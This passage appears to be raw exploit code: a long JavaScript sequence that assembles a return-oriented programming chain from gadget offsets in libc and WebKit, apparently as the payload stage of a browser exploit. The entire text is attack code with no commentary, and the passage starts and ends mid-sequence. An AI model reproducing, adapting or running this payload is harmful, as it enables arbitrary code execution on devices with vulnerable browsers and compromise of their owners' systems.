db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
__swbuf_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+141776,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+141848,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+141952,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+141968,
webkit_base+7438103,
libc_base+793877
]);

db([16, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(webkit_base+432898,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+142056,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+142072,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+142192,
webkit_base+7438103,
libc_base+793877,
ropchain+142208,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+142176,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+142304,
webkit_base+7438103,
libc_base+793877,
ropchain+142320,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+142432,
webkit_base+7438103,
libc_base+793877,
ropchain+142416,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+142520,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+142504,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+142616,
webkit_base+7438103,
libc_base+793877,
ropchain+142632,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+142744,
webkit_base+7438103,
libc_base+793877,
ropchain+142728,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+142816,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+142920,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+142936,
webkit_base+7438103,
libc_base+793877
]);

db([16, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(webkit_base+432898,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+143024,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+143040,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+143192,
webkit_base+7438103,
libc_base+793877,
ropchain+143224,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+143176,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+143208,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+143384,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+143336,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+143352,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([32, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+143512,
webkit_base+7438103,
libc_base+793877,
ropchain+143528,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+143496,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+143624,
webkit_base+7438103,
libc_base+793877,
ropchain+143640,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+143752,
webkit_base+7438103,
libc_base+793877,
ropchain+143736,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+143840,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+143824,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+143936,
webkit_base+7438103,
libc_base+793877,
ropchain+143952,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+144064,
webkit_base+7438103,
libc_base+793877,
ropchain+144048,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+144136,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+144240,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+144256,
webkit_base+7438103,
libc_base+793877
]);

db([16, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(webkit_base+432898,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+144344,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+144360,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+270800,
libc_base+793877,
ropchain+144520,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+144472,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+144488,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([16, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+144576,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+144680,
webkit_base+7438103,
libc_base+793877,
ropchain+144712,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+144696,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+144872,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+144824,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+144840,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+144976,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+144960,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([8, 0]);
set_gadget(libc_base+788575,);

db([8, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877546,
libc_base+793877,
ropchain+145184,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+145152,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+145288,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+145272,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+145368,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+145472,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+145488,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+270800,
libc_base+793877,
ropchain+145648,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+145600,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+145616,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([16, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+145704,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+145808,
webkit_base+7438103,
libc_base+793877,
ropchain+145840,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+145824,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+146000,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+145952,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+145968,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+146104,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+146088,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([8, 0]);
set_gadget(libc_base+788575,);

db([8, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+146304,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+146272,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([32, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+146408,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+146392,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877568,
libc_base+793877,
ropchain+146520,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+146488,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+146584,
webkit_base+7438103,
webkit_base+1786005,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+146640,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877,
ropchain+146784,
webkit_base+7438103,
libc_base+793877,
ropchain+146800,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+146768,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+146960,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+146912,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+146928,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+147088,
webkit_base+7438103,
libc_base+793877,
ropchain+147104,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+147072,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+147200,
webkit_base+7438103,
libc_base+793877,
ropchain+147216,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+147328,
webkit_base+7438103,
libc_base+793877,
ropchain+147312,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+147416,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+147400,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+147512,
webkit_base+7438103,
libc_base+793877,
ropchain+147528,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+147640,
webkit_base+7438103,
libc_base+793877,
ropchain+147624,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+147712,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+147776,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+147880,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+147912,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+148024,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+148008,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([1, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([1, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+792472
]);

db([4096, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+148336,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([1, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+792472
]);

db([2, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+148528,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+148640,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([65536, 0]);
set_gadget(libc_base+788575,);

db([65536, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+148768,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+148752,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+148920,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+157584,

libc_base+882884,
libc_base+793877
]);
db([4294967248, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+149016,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+149072,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([65536, 0]);
set_gadget(libc_base+788575,);

db([65536, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+149224,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+149280,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+149352,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+759626,
libc_base+792472
]);

db([312, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+759626,
libc_base+793877
]);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+149552,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+149568,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+149720,
webkit_base+7438103,
libc_base+793877,
ropchain+149752,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+149704,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+149736,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+149848,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+149832,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([1, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+150064,
webkit_base+7438103,
libc_base+793877,
ropchain+150080,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+150048,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+150200,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+150184,
webkit_base+7438103,
libc_base+759626,
libc_base+793877
]);

db([4294967284, 4294967295]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+759626,
libc_base+793877
]);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+150328,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+150344,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+150496,
webkit_base+7438103,
libc_base+793877,
ropchain+150528,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+150480,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+150512,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+150624,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+150608,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+792472
]);

db([15, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+150736,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877,
ropchain+150880,
webkit_base+7438103,
libc_base+793877,
ropchain+150896,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+150864,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+151016,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+151000,
webkit_base+7438103,
libc_base+759626,
libc_base+793877
]);

db([4294967284, 4294967295]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+759626,
libc_base+793877
]);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+151144,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+151160,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+151312,
webkit_base+7438103,
libc_base+793877,
ropchain+151344,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+151296,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+151328,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+151440,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+151424,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([1, 0]);
set_gadget(libc_base+788575,);

db([1, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+151656,
